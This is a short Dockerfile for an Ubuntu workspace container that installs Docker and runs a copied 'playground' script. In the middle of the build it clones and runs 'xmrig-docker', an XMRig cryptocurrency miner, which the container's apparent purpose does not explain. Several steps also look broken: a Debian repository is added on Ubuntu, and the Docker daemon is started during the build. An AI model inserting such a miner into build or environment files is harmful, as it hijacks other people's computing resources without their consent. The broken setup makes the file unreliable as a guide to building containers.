# a base image
FROM ubuntu:22.04
# RUN cat /etc/*release
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git 
RUN apt-get -y install apt-transport-https ca-certificates curl gnupg2 software-properties-common
RUN curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
RUN add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable"
RUN apt-get update
RUN apt-get -y install docker-ce
RUN bash service docker start
RUN sudo /etc/init.d/docker start
RUN docker run hello-world
RUN git clone https://github.com/xarzoa/xmrig-docker && cd xmrig-docker && sudo docker build . -t xmrig && sudo docker run xmrig

# Execute next commands in the directory /workspace
WORKDIR /workspace

# Copy over the script to the /workspace directory
COPY playground script.sh ./

# Just in case the script doesn't have the executable bit set
RUN chmod +x ./script.sh

# Run the script when starting the container
CMD [ "./script.sh" ]
